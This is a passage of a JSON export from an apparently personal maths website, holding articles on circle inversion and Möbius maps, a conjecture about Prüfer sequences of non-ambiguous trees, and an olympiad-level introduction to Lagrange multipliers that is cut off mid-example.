"prime-factorisation"}, {"type": "article", "coming_soon": false, "mod_timestamp": 1689364800.0, "mod_date_time": "14 Jul 2023", "cr_timestamp": 1689364800.0, "cr_date_time": "14 Jul 2023", "tags": [{"name": "conjecture", "colour": "purple"}], "title": "Associated Permutations of Complete Non-Ambiguous Trees", "content": "View on arXiV Not much on this page, I just needed somewhere to note down a seemingly magical but random conjecture that we felt wasn\\'t relevant enough to make it into the final paper. Let $h(n,k)$ be the number of Prufer sequences ending in $k$ that represent a tree whose adjacency matrix is a valid CNAT of size $n$. Then: $$h(n,k) = \\\\begin{cases} \\\\frac{(n-1)!}{k(k+1)} & \\\\text{if } 1\\\\leq k < n-1\\\\\\\\\\\\\\\\0 & \\\\text{if } k=n-1\\\\\\\\\\\\\\\\(n-2)! & \\\\text{if } k=n \\\\end{cases}$$ We were only able to prove the last two cases.", "id": -2284088067020260140, "dir": ["maths"], "is_book_member": false, "name": "cnats"}, {"type": "article", "coming_soon": false, "mod_timestamp": 1756656000.0, "mod_date_time": "31 Aug 2025", "cr_timestamp": 1756656000.0, "cr_date_time": "31 Aug 2025", "tags": [], "title": "1. Circle Inversion", "content": "In this first part, before we even talk about complex numbers, we\\'re going to build up some intuition for a fancy transformation of the plane called \"inversion\". This will be extremely useful in the next part, when we build on this to derive M\u00f6bius maps. Background: Interactive Intuition When solving 2D geometry problems, usually we want to find some transformation of the plane that makes our problem easier to solve. Most people are familiar with linear transformations, like rotation, reflection, or scaling (zooming in/out). Play around with the interactive toy below: Circle Inversion is another transformation of the plane, but it\\'s nonlinear, which means it does some wild things. Drag the slider below to see what it looks like: In the visualisation above, inversion distorts each of the shapes, except for the circle, which only changes size. This is a key property of inversion: circles map to circles (or lines). We\\'ll explore this more later. Notice that points close to the centre get mapped very far away, whereas points near the dotted circle stay near it. Also notice how the lines of the cartesian grid change: the gridlines meet at right angles, and after inverting, although the gridlines have become curved, they still meet at right angles! (Imagine zooming into a meeting point until the curved lines become basically straight) You can see the angle at the meeting point is also preserved for the edges of the triangle meeting at a vertex (it\\'s 60 degrees initially, and still 60 degrees after you slide the slider all the way to the right). This angle preservation property turns out to be true for any two (sufficiently smooth) curves that meet at a point. Let\\'s state this neatly: If two curves meet at an angle $\\\\alpha$, then after inversion, the two inverted curves will still meet at an angle $\\\\alpha$. This property, of preserving meeting angles of curves, is called being a conformal map. I think it\\'s pretty cool - even though inversion is this crazy operation that flips a plane inside-out, it still preserves angles! Summarized: Inversion is a conformal map. The Formal Definition Let $C$ be a reference circle with centre $O$ and positive radius $r$. We define inversion about $C$ to be the transformation of the plane that does the following: for any point $A$, we send $A$ to the point $A^*$ lying on ray $OA$ such that length $OA^* = \\\\frac{r^2}{OA}$. You can visualise this as follows: in the diagram above, as $A$ moves closer and closer to $O$ along the coloured line, the point $A^*$ will slide rapidly further and further away along the coloured line. This alludes to an issue: our definition does not work when $A=O$, since $A^*$ would have to be infinitely far away. To fix this, we add a special point at infinity to the plane, denoted $P_\\\\infty$, and define that $O$ is sent to $P_\\\\infty$ and vice versa. You can think of this as saying \"$\\\\frac{r^2}{0} = \\\\infty$\" and \"$\\\\frac{r^2}{\\\\infty} = 0$\". Points on the reference circle stay fixed under inversion. (Try to show this using the formal definition, then go back to the interactive visualisation to check it looks plausible!) The value of $r$ is actually irrelevant - since, in the diagram above, we have $OA^* = r^2 \\\\cdot \\\\frac{1}{OA}$, doing an inversion about a circle of radius $r$ is equivalent to inverting with radius 1, and then scaling with scale factor $r^2$. So, up to zooming in/out, all inversions about $O$ are the same. Just like reflection, inversion is self-inverse - if you do it twice, the second transformation undoes the first one. In other words, inversion swaps pairs of points (e.g. in the diagram above, $A$ gets sent to $A^*$, and $A^*$ gets sent to $A$). Where Do Circles Go? As we mentioned earlier, it\\'s an interesting fact that inversion sends circles to circles. Let\\'s try to look at this in more detail. As you can see, it looks like inversion sends circles to circles! However, sometimes something interesting happens... Try moving the solid circle so that it passes through the centre of inversion (that is, the centre of the gray dotted circle). What happens to the inversion result, and why? The result of inversion is a circle, because inversion sends circles to circles. The result of inversion is a line, because it\\'s a circle that passes through $P_\\\\infty$ (since the inversion centre is sent to $P_\\\\infty$). The result of inversion is a square, because my eyes have gone square from reading this article. Instead of saying \"circles and lines\" all the time, we define a cline to be a circle or a line. By now, hopefully your intuition agrees that: a line is just a circle with infinite radius. Every ordinary line passes through our special \"point at infinity\", $P_\\\\infty$, and no circle passes through it. In other words, a cline is a line if and only if it passes through $P_\\\\infty$. Now we can phrase our observation as: Inversion sends clines to clines. This property is what makes inversion so powerful for solving problems - inversion lets us turn circles (which are tricky to deal with) into lines (which are easy to deal with). It might not seem like it right now, but recall that the end goal of this book is to teach you about M\u00f6bius maps, which are a topic in complex analysis. So far, we\\'ve only introduced inversion. But I promise that in the next part, all the intuition you will build in this part, will be 100000% worth it. Example Problem To try and get our heads around some of the key properties of inversion that we\\'ve discussed so far, let\\'s use inversion to destroy this maths olympiad problem from EGMO. Let $\\\\triangle ABC $ be a right triangle with $\\\\angle C = 90^{\\\\circ}$ and let $X$ and $Y$ be points in the interiors of $CA$ and $CB$, respectively. Construct four circles passing through $C$, centred at $A, B, X, Y$ . Prove that the four points lying on at exactly two of these four circles are concyclic (i.e. lie on a common circle). Since $C$ has a lot of circles passing through it, we will invert about $C$ (so that all those circles turn into lines). Let\\'s invert around $C$, with arbitrary radius. Can you figure out what the gray circles turn into? Under inversion, the two circles with centres on segment BC, become two lines that are perpendicular to $BC$ (i.e., horizontal lines). We know the two circles in question both invert to lines, because they pass through the centre of inversion $C$. Now we need to show these lines meet ray $CB$ at right angles. Remember the conformal map property? Let\\'s use it as follows. The two circles in question, meet ray $CB$ at right angles at two points (one of which is $C$). Since inversion is a conformal map, the inversion of each circle (which we already know is a line), meets the inversion of ray $CB$, which is ray $CB$ itself, at right angles. So we\\'re done. Similarly to the Claim, the other two circles with centres on segment AC, become two lines that are perpendicular to $AC$ (i.e., vertical lines). Now in the original diagram, consider the four points lying on exactly two of these four circles. They form a quadrilateral that we wish to show is concyclic. Well, under inversion, these points go to the intersection of our four created horizontal/vertical lines (see the diagram). But these inverted points form a rectangle! Since rectangles are definitely concyclic, our four inverted intersection points lie on a common circle. But inversion sends clines to clines, therefore the original four points must also lie on a common circle, as required. Done. This problem is a good demonstration of how powerful inversion can be, when you have a lot of circles passing through a single point. We\\'ve also found a use for the key properties of inversion that we discussed earlier. Key Properties: Pop Quiz Here\\'s a little test of everything we\\'ve learned so far - there are also a couple of unseen statements, so if you\\'re not sure about any of the statements, go back to the interactive displays and experiment away! Select all statements that are true: Inversion is self-inverse - that is, it swaps pairs of points. Inversion sends circles to circles. Inversion sends circles and lines, to circles and lines. Inversion is not a conformal map - that is, it does not preserve angles at the meeting point of two curves. If the original circle is tangent to the circle of inversion, then so is the inverted circle, because points on the circle of inversion are fixed. It is possible for inversion to send a circle to itself. (Hint: in the interactive display above, can you get the two coloured circles to overlap?) Hopefully you now love inversion as much as I do. In the next part, we\\'re going to neatly describe inversion using the complex plane, and use it to derive M\u00f6bius maps. This is hard to prove using pure Euclidean geometry, since we need the notion of \"tangent lines\" to curves, meaning we need the notion of a 2D derivative. This is where complex analysis is useful!\u21a9", "id": 3668621378749532815, "dir": ["maths", "mobius-maps"], "is_book_member": true, "name": "1-inversion"}, {"type": "article", "coming_soon": false, "mod_timestamp": 1756659600.0, "mod_date_time": "31 Aug 2025", "cr_timestamp": 1756659600.0, "cr_date_time": "31 Aug 2025", "tags": [], "title": "Introducing M\u00f6bius Maps", "content": "So far, we\\'ve introduced inversion, found some key properties, and used it to solve a geometry problem. As a recap, the two key properties of inversion are that it is a conformal map (preserves angles at the meeting point of two curves) and sends clines to clines. Just to hammer it home: Inversion is a conformal map that sends clines to clines. The above sentence is the ONLY thing about inversion we care about; if any other map is conformal and sends clines to clines, then it is just as overpowered as inversion. In this article, we\\'ll view the 2D plane instead as the complex plane, and leverage our inversion intuition to derive M\u00f6bius maps. Why are Complex Numbers Relevant? So far we\\'ve been working with the 2D plane (with $P_\\\\infty$ added). But as you might already know, we can describe 2D planes with complex numbers, using the complex plane, denoted $\\\\mathbb{C}$. Thus, we can view inversion as a function (i.e. transformation) that acts on the complex plane (with $P_\\\\infty$ added). We write this in shorthand by saying inversion is a function on $\\\\mathbb{C} \\\\cup \\\\{P_\\\\infty\\\\}$. Can we find this function explicitly? Recall the definition of inversion, in which we scale points along a ray from the origin: The point $A$ is sent to the point $A^*$, where $OA \\\\cdot OA^* = r^2$. Since we\\'re reframing in terms of the complex plane, we replace the above sentence with: The complex number $A$ is sent to the complex number $A^*$, where $|A| \\\\cdot |A^*| = r^2$. Here, in the complex plane, $O$ is zero (the origin), so that length $OA$ equals the magnitude of the complex number $A$ (which we denoted $|A|$). In the complex plane, inversion about the origin with radius 1, is described by the function $z \\\\mapsto \\\\overline{ 1/z }$, where the line on top represents complex conjugation (i.e. reflection in the x-axis). For any (nonzero) complex number $z$, we can decompose it into $|z| \\\\cdot \\\\frac{z}{|z|}$, that is, its magnitude, multiplied by a direction of unit length. Now for inversion, we keep the direction the same, but we modify the magnitude from $|z|$ to $\\\\frac{1}{|z|}$. Therefore the inversion of the complex number $z$, is $\\\\frac{1}{|z|} \\\\cdot \\\\frac{z}{|z|}$ (the new magnitude, times the same direction as before). This simplifies to $\\\\overline{1/z}$ as required, using the fact that $|z|^2 = z \\\\overline{z}$. The Reciprocal map We\\'ve just seen that inversion is described by the map $z \\\\mapsto \\\\overline{1/z}$, i.e. the map $1/z$, followed by reflection in the x-axis. Well, we can flip this on its head, to discover a new map called the reciprocal map $z \\\\mapsto 1/z$; which is just inversion followed by reflection in the x-axis! \"Why is this special?\", you ask. Well, taking the reciprocal of a complex number is a very elementary / philosophically basic thing to do (as opposed to inversion; $\\\\overline{1/z}$ looks so ugly compared to $1/z$). What we\\'ve just done is given a geometrical interpretation of this reciprocal map, as a composition of transformations of the plane: again, it is inversion followed by reflection in the x-axis. EVEN BETTER THAN A MERE GEOMETRICAL INTERPRETATION: Recall the point I hammered home at the top of this page: inversion is a conformal map that sends clines to clines. (I\\'m about to write \"conformal map that sends clines to clines\" so many freaking times, that I\\'ll temporarily abbreviate it to \"CCC\". So inversion is CCC.) Guess what else is CCC? Reflection! (Proof: reflection preserves angles, circles and lines, because it preserves basically everything.) Therefore, the reciprocal map, which again, is inversion (which is CCC) composed with reflection (which is also CCC), is also CCC! Let\\'s write this important statement out in full: The reciprocal map is a conformal map that sends clines to clines. Pop Quiz Which of these functions on the complex plane (with $P_\\\\infty$ added) are conformal maps that send clines to clines? Reflection; $z \\\\mapsto \\\\overline{z}$ Rotation; $z \\\\mapsto cz$ where $c \\\\in \\\\mathbb{C}, |c|=1$ Translation; $z \\\\mapsto a + z$ where $a \\\\in \\\\mathbb{C}$ Scaling; $z \\\\mapsto cz$ where $c \\\\in \\\\mathbb{R}, c \\\\neq 0$ Reciprocal; $z \\\\mapsto 1/z$ $z \\\\mapsto 1 + 1/z$ $z \\\\mapsto \\\\frac{1 + 2z}{3 + 4z}$ (Hint for the last one: can you rewrite the fraction as the composition of a bunch of functions that you already know are conformal maps that sends clines to clines?) View the spoiler below if you\\'re stuck: For example, $$\\\\frac{1 + 2z}{3 + 4z} = \\\\frac{1}{2} \\\\left( 1 - \\\\frac{1}{4z+3} \\\\right)$$ So to send $z$ to $\\\\frac{1+2z}{3+4z}$, we perform the following transformations in order: scale by scale factor 4 translate by 3+0i apply reciprocal map rotate by 180deg (i.e. multiply by -1) translate by 1+0i scale by scale factor 1/2 Finally, M\u00f6bius Maps We define M\u00f6bius Maps, or M\u00f6bius Transformations, to be those of the form $$z \\\\mapsto \\\\frac{az+b}{cz+d}$$ where $ad-bc \\\\neq 0$. We require $ad-bc \\\\neq 0$ so that the map is actually bijective: if $ad=bc$ then $\\\\frac{az+b}{cz+d} = \\\\frac{a}{c}$ sends every complex number $z$ to the same output. Now, I could\\'ve led with this definition at the very start of everything. But the ENTIRE POINT of all of what I\\'ve written up to this definition, is to motivate the following key property of M\u00f6bius maps: M\u00f6bius maps are conformal maps that send clines to clines. To prove this, we need to show $z \\\\mapsto \\\\frac{az+b}{cz+d}$ is a conformal map that sends clines to clines. But, I hope you\\'ve done the pop quiz above - this is just a generalisation! More specifically, it\\'s an exercise for you to show that we can deconstruct $\\\\frac{az + b}{cz + d}$ into the composition of translations, reciprocals, rotations and scaling. All of these component functions are conformal maps that send clines to clines, hence so is their composition. Example Question We\\'ve now covered ALL OF THE THEORY, whoop whoop. Now, we should be ready to solve M\u00f6bius map problems using the \"conformal map that sends clines to clines\" property. I\\'ll end our journey by hinting at an example. Find a M\u00f6bius map that takes the region between the circles $\\\\{|z|=1\\\\}$ and $\\\\{|z \u2212 1| = 5/2\\\\}$ to an annulus $\\\\{1 < |z| < R\\\\}$; you may choose the value of $R$. Since I want you to actually understand what\\'s going on, I won\\'t provide the full solution here. But, here\\'s a hint on how to approach it: To construct a M\u00f6bius map, let\\'s invert the left diagram about -1.5 (which lies on the outer circle), and invert the right diagram about -2 (which lies on the outer circle). Each of these inversions transform the coloured regions to an infinite region between a line and a circle. These two regions will be related by a translation and scaling. If we chain together all these transformations, we will get the final M\u00f6bius map. It actually comes out to be quite nice. Conclusion Just to check that you\\'re still alive, so far we\\'ve covered the following: Intuition behind circle inversion, and a practice problem. This gave you a taste of what it\\'s like to use the \"conformal map that sends clines to clines\" property to solve problems. Derivation of defintion of a M\u00f6bius map, and the fact that M\u00f6bius maps are conformal maps that send clines to clines. A practice M\u00f6bius maps problem. This is where I\\'ll be ending our journey. (Sorry I didn\\'t have time to go more in depth!) I hope you enjoy Mobius map questions as much as me now! If you liked this content, you might like to self-study the Complex Analysis Tripos course, which covers most of what I\\'ve told you (specifically, look for the section on conformal equivalences). If you\\'re savvy with your olympiad geometry, alternatively you could try to use Circles of Apollonius :)\u21a9", "id": 9161650510803339574, "dir": ["maths", "mobius-maps"], "is_book_member": true, "name": "2-mobius"}, {"type": "book", "coming_soon": false, "mod_timestamp": 1756656000.0, "mod_date_time": "31 Aug 2025", "cr_timestamp": 1756656000.0, "cr_date_time": "31 Aug 2025", "tags": [{"name": "complex-analysis", "colour": "green"}, {"name": "geometry", "colour": "cyan"}], "title": "Using M\u00f6bius Maps to Manipulate the Complex Plane", "content": "As with all olympiad addicts, when I started university maths, I had to deal with a massive wave of depression when I realised that all those years I spent learning olympiad tricks, theorems and techniques, were useless. \"I\\'ll never need cyclic quadrilaterals again\", I thought. Even worse, Euclidean geometry was my favourite subject - but it seems to vanish off the face of the earth as soon as high school finishes. Well, this all changed in my second year of university, when I took a complex analysis course that BLEW MY MIND. It made me realise that olympiad geometry has a use after all! There\\'s a beautiful concept in complex analysis called a M\u00f6bius map, and it turns out to be very similar to olympiad inversion (if you know what that is). Today I\\'ll do my best to build the intuition from the ground up. I\\'m going to teach you how to use M\u00f6bius maps to beat up the complex plane like it owes you money. More concretely, I\\'m going to give you the tools to solve questions like this: Find a bijective differentiable function taking the region between the circles $\\\\{|z|=1\\\\}$ and $\\\\{|z \u2212 1| = 5/2\\\\}$ to an annulus $\\\\{1 < |z| < R\\\\}$; you may choose the value of $R$. We care about questions like this, because you can think of \"differentiable bijection\" as meaning a \"smooth deformation\" of one shape into another; these turn out to preserve certain properties (for example, the fact that the region has a hole). So if we can find such maps, then the two shapes are \"basically the same\" - if you\\'ve ever heard of the \"a mug is the same as a donut\" joke, it\\'s the same thing. Prerequisites You should be comfortable with the idea of a complex number, and know what the complex plane is. Any kind of background from olympiad geometry is good as well, but don\\'t worry; I\\'ll try my best to fill in any holes. Here from SoME4? Welcome! I\\'d recommend viewing this content on desktop. Please read the guide below, then dive in to the first page of this book.", "id": -1317720639761272118, "dir": ["maths"], "is_book_member": true, "name": "mobius-maps"}, {"type": "article", "coming_soon": false, "mod_timestamp": 1755871200.0, "mod_date_time": "22 Aug 2025", "cr_timestamp": 1689350400.0, "cr_date_time": "14 Jul 2023", "tags": [{"name": "olympiad", "colour": "purple"}, {"name": "analysis-intro", "colour": "indigo"}], "title": "Revenge of Analysis: Using Lagrange Multipliers to Destroy Olympiad Inequalities", "content": "Goal: learn how to use Lagrange multipliers in olympiads. This article is aimed at the level of ambitious teenagers looking to get a taste of higer-level analysis concepts. Lagrange multipliers are a nice tool to solve inequalities, but they are rarely seen in olympiad solutions. Once you are comfortable with it, it can be an overpowered way smash open inequalities without much insight. (So economists love them!) For this reason, we need to approach it rigorously, to ensure we can justify earning marks. I really recommend watching this video to get some intuition first. Background Theory All of this is covered in my course notes for IB Analysis and Topology, in the relevant sections. The results and definitions in this article are correct only for $\\\\mathbb{R}^n$ (e.g. compactness is something different, but the Heine-Borel theorem says that in $\\\\mathbb{R}^n$ it\\'s equivalent to being closed and bounded). For the more general definitions and a deeper understanding, check out the course notes. Consider a set $M$ together with a function $d : M \\\\times M \\\\to \\\\mathbb{R}$. $(M, d)$ is a metric space (and we call $d$ a metric / \"distance function\") if: $d(x,y) \\\\geq 0$, equality if and only if (\"iff\") $x=y$ (\"positive semi-definite\") $d(x,y) = d(y,x)$ (\"symmetric\") $d(x,y) + d(y,z) \\\\geq d(x,z)$ (\"triangle inequality\") $(\\\\mathbb{R}^n, d)$ is a metric space, where: $$\\\\mathbb{R}^n = \\\\{(x_1, \\\\cdots, x_n) \\\\mid x_i \\\\in \\\\mathbb{R}\\\\}$$ $$d(x,y) = \\\\sqrt{\\\\sum_{i=1}^n (x_i-y_i)^2}$$ This is the most common metric you are probably familiar with, and we\\'ll be working in this standard metric space for the rest of the article. The open ball in $\\\\mathbb{R}^n$ with centre $p \\\\in \\\\mathbb{R^n}$ and radius $r$ is $$B(p,r) := \\\\{x \\\\in \\\\mathbb{\\\\mathbb{R}^n} \\\\mid d(p,x) \\\\lt r \\\\}$$ Similarly, the closed ball $B[p,r]$ is the set: $$\\\\{x \\\\in \\\\mathbb{R}^n \\\\mid d(p,x) \\\\leq r\\\\}$$ Any finite open interval in $\\\\mathbb{R}$ is an open ball ($n=1$), because for any open interval $(a,b) \\\\subset \\\\mathbb{R}$, it is equal to $B(\\\\frac{a+b}{2}, \\\\frac{b-a}{2})$. $B[0,1]$ in $\\\\mathbb{R}^2$ is Now let\\'s define open sets, not just open balls. An \\'open set\\' is a set such that for any point $x$ in the set, we can fit an open ball around $x$, while staying inside the set. More formally: $U \\\\subseteq \\\\mathbb{R}^n$ is open if for every $p \\\\in U$, $\\\\exists r\\\\gt 0$ s.t. $B(p,r) \\\\subset U$. Open sets capture the idea of sets which have an \"empty boundary\". We will also need the idea of limits. Let $(x_k)_{k=1}^\\\\infty$ be a sequence in $\\\\mathbb{R}^n$. The sequence converges to the point $x_\\\\infty$ if $\\\\forall \\\\epsilon \\\\gt 0, \\\\exists n_0 \\\\in \\\\mathbb{N}$ such that: $$n \\\\geq n_0 \\\\implies d(x_n, x_\\\\infty) \\\\lt \\\\epsilon$$ Then $x_\\\\infty$ is denoted $\\\\lim_{n \\\\to \\\\infty}(x_n)$. Let $x_n = \\\\left(\\\\frac{1}{n}, \\\\frac{1}{n}\\\\right)$, then $\\\\lim_{n \\\\to \\\\infty} x_n = (0,0)$. $\\\\lim_{n \\\\to \\\\infty} \\\\left(1-\\\\frac{1}{n}\\\\;,\\\\; \\\\frac{1}{n^2}\\\\right) = (1,0)$ Which of the following are open sets in $\\\\mathbb{R}$? $\\\\{x \\\\in \\\\mathbb{R} : x < 23\\\\}$ $\\\\mathbb{Q}$ (the set of rational numbers) $\\\\mathbb{R} \\\\setminus \\\\mathbb{Q}$ (the set of irrational numbers) Let $S \\\\subseteq \\\\mathbb{R}^n$. $S$ is closed if for every sequence of points $(x_k)_{k=1}^\\\\infty$ that satisfies $x_k \\\\in S \\\\;\\\\forall\\\\; k$, we have $\\\\left( \\\\lim_{k \\\\to \\\\infty} x_k \\\\right) \\\\in S$. $B(0,1)$ is not closed because we can take $x_k = (1 - \\\\frac{1}{k}, 0, \\\\cdots, 0).$ Any open ball together with one point on the boundary, is neither closed nor open. Let $A \\\\in \\\\mathbb{R}^n$. The closure of $A$, denoted $\\\\bar A$, is the smallest closed set containing $A$. $A \\\\subseteq \\\\mathbb{R}^n$ is closed if and only if $\\\\mathbb{R}^n \\\\setminus A$ is open. Let $U,V$ be open sets. Then $U \\\\cap V$ and $U \\\\cup V$ are also open sets. This extends to finite intersections and infinite unions. Let $S,T$ be closed sets. Then $S \\\\cap T$ and $S \\\\cup T$ are also closed sets. This extends to infinite intersections and finite unions. I remember the arrangement of \"finite/infinite\" in these statements by remembering \"open sets work well with unions\". $A \\\\subseteq \\\\mathbb{R}^n$ is bounded if $\\\\exists\\\\, R \\\\in \\\\mathbb{R}, R\\\\gt 0$ such that $A \\\\subseteq B(0, R)$. A subset $K \\\\subseteq \\\\mathbb{R}^n$ is compact if it is closed and bounded. Let $D \\\\subseteq \\\\mathbb{R}^n$ and let $f : D \\\\to \\\\mathbb{R}$. $f$ is continuous at the point $p \\\\in D$ if $\\\\forall \\\\epsilon \\\\gt 0$, $\\\\exists \\\\delta \\\\gt 0$ such that $\\\\forall x \\\\in D$ we have: $$d(p,x) \\\\lt \\\\delta \\\\implies \\\\lvert f(x) - f(p) \\\\rvert \\\\lt \\\\epsilon$$ $f$ is continuous if it is continuous at every point. Informally, no matter how small $\\\\epsilon$ you pick, I can always find a region around $p$ where the change in $f$ is smaller than $\\\\epsilon$. So, a small change in input causes a small change in ouput. $f : \\\\mathbb{R}^n \\\\to \\\\mathbb{R}$, $f(x_1, \\\\cdots, x_n) = x_1 + \\\\cdots + x_n$ Let $f : K \\\\to \\\\mathbb{R}$ be a continuous function, where $K \\\\subseteq \\\\mathbb{R}^n$ is a nonempty compact set. Then $f$ has both a global maximum value and a global minimum value: $$\\\\exists\\\\, x \\\\in K \\\\text{ s.t. } f(x) \\\\geq f(y) \\\\;\\\\forall\\\\, y \\\\in K$$ $$\\\\exists\\\\, x\\' \\\\in K \\\\text{ s.t. } f(x\\') \\\\leq f(y) \\\\;\\\\forall\\\\, y \\\\in K$$ Let $K$ be a closed ball in $\\\\mathbb{R}^2$, then $K$ is compact. Let $f : K \\\\to \\\\mathbb{R}, f(x) = d(x,(0,0))$ which is continuous. Then the theorem says that there is a point(s) on $K$ which is closest to $(0,0)$, and a point(s) which is furthest. Note: We need to assume $K$ is closed for this theorem, else we can construct a counterexample where $f$ increases to infinity the closer you get to the edge. Let $g : \\\\mathbb{R}^n \\\\to \\\\mathbb{R}$ be continuous. Then for a fixed $c \\\\in \\\\mathbb{R}$, the set $$\\\\{ x \\\\in \\\\mathbb{R}^n \\\\mid g(x) = c \\\\}$$ is closed in $\\\\mathbb{R}^n$. Partial Derivatives I\\'m assuming you\\'ve already met these, so I\\'ll recap. $f : \\\\mathbb{R}^3 \\\\to \\\\mathbb{R}, f(x,y,z) = x^2 + y^2 + z^2$ $$\\\\frac{\\\\delta f}{\\\\delta x} = 2x, \\\\frac{\\\\delta f}{\\\\delta y} = 2y, \\\\frac{\\\\delta f}{\\\\delta z} = 2z, \\\\nabla f = (2x,2y,2z)$$ $f : (0, +\\\\infty) \\\\times (0, +\\\\infty) \\\\to \\\\mathbb{R}, f(x,y) = \\\\sqrt{xy}$. $$\\\\nabla f = \\\\left(\\\\frac{\\\\sqrt y}{2 \\\\sqrt x}, \\\\frac{\\\\sqrt x}{2 \\\\sqrt y}\\\\right)$$ The Big Theorem Finally! Let $U \\\\subset \\\\mathbb{R}^n$ be an open set and let $f,g : U \\\\to \\\\mathbb{R}$ be continuous functions with continuous partial derivatives of the first order. Let $c \\\\in \\\\mathbb{R}$ and $S = \\\\{x \\\\in U \\\\mid g(x) = c\\\\}$. (Note: $S$ doesn\\'t have to be open or closed, that\\'s $U$!) Then, if $x_0 \\\\in S$ is a local max or min, then either: $$\\\\left( \\\\frac{\\\\delta g}{\\\\delta x}, \\\\frac{\\\\delta g}{\\\\delta y}, \\\\frac{\\\\delta g}{\\\\delta z},\\\\cdots\\\\right) = (0,0,0,\\\\cdots)$$ Or $\\\\exists \\\\lambda \\\\in \\\\mathbb{R}$ such that: $$\\\\frac{\\\\delta f}{\\\\delta x}(x_0) = \\\\lambda \\\\frac{\\\\delta g}{\\\\delta x}(x_0),$$ $$\\\\frac{\\\\delta f}{\\\\delta y}(x_0) = \\\\lambda \\\\frac{\\\\delta g}{\\\\delta y}(x_0),$$ $$\\\\frac{\\\\delta f}{\\\\delta z}(x_0) = \\\\lambda \\\\frac{\\\\delta g}{\\\\delta y}(x_0),$$ $$\\\\text{etc.}$$ Example Problem 1 Let $x,y,z \\\\geq 0$ such that $x+y+z = 1$. Find the min and max of $xyz$. Let $f(x,y,z) = xyz$ and $g(x,y,z)=x+y+z$; these are polynomial functions and so are continuous. We are maximizing and minimizing $f$, subject to a condition on $g$. $0 \\\\leq x,y,z \\\\leq 1$ so we\\'re only interested in the cube $[0,1] \\\\times [0,1] \\\\times [0,1]$. $x+y+z=1$ is a plane Let $U = (0,1)^3$, then $\\\\bar U = [0,1]^3$. Let $S = \\\\{x \\\\in U \\\\mid g(x)=1\\\\}$, then $\\\\bar S$ is bounded hence compact. Hence $f$ has a global max and min in $\\\\bar S$. The global extrema might be on the boundary of $\\\\bar S$. If so then we cannot apply LM, because the extrema will not be in $S$. If we are on the boundary, then one of $x,y,z$ is $0$, so $f(x,y,z) = xyz = 0$. Thus $f$ is zero everywhere on the boundary, so $0$ would be an extremum. If we are not on the boundary, then we are in $S$, so we can apply LM. $$\\\\frac{\\\\delta g}{\\\\delta x} = 1, \\\\frac{\\\\delta g}{\\\\delta y} = 1, \\\\frac{\\\\delta g}{\\\\delta z} = 1$$ So we are in the second case of the theorem, because $(1,1,1) \\\\neq (0,0,0)$. $$\\\\frac{\\\\delta f}{\\\\delta x} = yz, \\\\frac{\\\\delta f}{\\\\delta y} = xz, \\\\frac{\\\\delta f}{\\\\delta z} = xy$$ So $yz = \\\\lambda \\\\cdot 1$, $xz = \\\\lambda \\\\cdot 1$, $xy = \\\\lambda \\\\cdot 1$. This implies $xy = yz = zx$ so $x=y=z$, and finally $x+y+z = 1$ $\\\\implies$ $x=y=z=\\\\frac{1}{3}$, so an extremal value of $f$ is $\\\\frac{1}{27}$. Overall, all extreme values of $f$ on $\\\\bar S$ are $0$ or $\\\\frac{1}{27}$. $$\\\\therefore 0 \\\\leq xyz \\\\leq \\\\frac{1}{27}$$ Example Problem 2 Let $x,y,z \\\\geq 0$ such that $x+y+z = 1$. Show that $$0 \\\\leq yz+zx+xy-2xyz \\\\leq \\\\frac{7}{27}$$ Note $0 \\\\leq x,y,z \\\\leq 1$. Let $U = (0,1)^3$ and $S = \\\\{ x \\\\in U \\\\mid g(x) = 1\\\\}$. Let $f(x,y,z) = yz+zx+xy-2xyz$ and $g(x,y,z) = x+y+z$, where $f,g : U \\\\to \\\\mathbb{R}$. Then $f,g$ are continuous and have continous partial derivatives (because polynomial on open set). Now, $\\\\bar U = [0,1]^3$ and $\\\\bar S = \\\\bar U \\\\cap \\\\{x \\\\in \\\\mathbb{R}^3 \\\\mid g(x)=1\\\\}$ which is closed and bounded hence compact. Hence $f$ has a global max and min on $\\\\bar S$. Let $x_0 = (x,y,z)$ be a global extremum. If $x_0$ is on the boundary: Then one of $x,y,z$ is $0$, WLOG $z=0$. Then $x+y=1$ and we wish to show that $0 \\\\leq xy \\\\leq \\\\frac{7}{27}$. $$x \\\\geq 0, y \\\\geq 0 \\\\implies xy \\\\geq 0$$ $$xy \\\\leq \\\\left(\\\\frac{x+y}{2}\\\\right)^2 = \\\\frac{1}{4} \\\\lt \\\\frac{7}{27} \\\\;\\\\;\\\\checkmark$$ Else, $x_0$ is not on the boundary. Then $S$ has a global extremum in $f$, namely $x_0$. So I can apply LM. $$g(x,y,z)=x+y+z$$ $$\\\\nabla g = \\\\left(\\\\frac{\\\\delta g}{\\\\delta x}, \\\\frac{\\\\delta g}{\\\\delta y}, \\\\frac{\\\\delta g}{\\\\delta z}\\\\right)=(1,1,1)$$ Since $\\\\nabla g \\\\neq (0,0,0)$, the only possibility is $\\\\nabla f = \\\\lambda \\\\cdot \\\\nabla g$. $$f(x,y,z) = yz + zx + xy - 2xyz$$ $$\\\\frac{\\\\delta f}{\\\\delta x} = z+y-2yz$$ $$\\\\frac{\\\\delta f}{\\\\delta y} = x+z-2xz$$ $$\\\\frac{\\\\delta f}{\\\\delta z} = y+x-2yx$$ So, $z+y-2yz = \\\\lambda \\\\cdot 1$, $x+z-2xz = \\\\lambda \\\\cdot 1$, $y+x-2yx = \\\\lambda \\\\cdot 1$ Solving for $x,y,z$: First case : $x,y,z \\\\neq \\\\frac{1}{2}$ $z+y-2yz=\\\\lambda$ $\\\\implies y(1-2z) = \\\\lambda - z$ $\\\\implies y = \\\\frac{\\\\lambda - z}{1-2z}$ Similarly, $x = \\\\frac{\\\\lambda - z}{1-2z}$ So $x=y$, and similarly $x=y=z$. $x+y+z = 1$ $\\\\implies x=y=z=\\\\frac{1}{3}$ Second case : one of $x,y,z$ is $\\\\frac{1}{2}$ WLOG $z = \\\\frac{1}{2}$, then $\\\\frac{1}{2} + y - 2y\\\\cdot \\\\frac{1}{2} = \\\\lambda$ $\\\\implies \\\\lambda = \\\\frac{1}{2}$ $x+y = 1-z$ $\\\\implies x+y=\\\\frac{1}{2}$ $x+y-2xy = \\\\lambda$ $\\\\implies \\\\frac{1}{2} - 2xy = \\\\frac{1}{2}$ $\\\\implies xy = 0$, but this cannot happen in the interior. Thus overall, The extremum $x_0$ must equal $(\\\\frac{1}{3}, \\\\frac{1}{3}, \\\\frac{1}{3})$. $$f\\\\left(\\\\frac{1}{3}, \\\\frac{1}{3}, \\\\frac{1}{3}\\\\right) = \\\\frac{1}{9} + 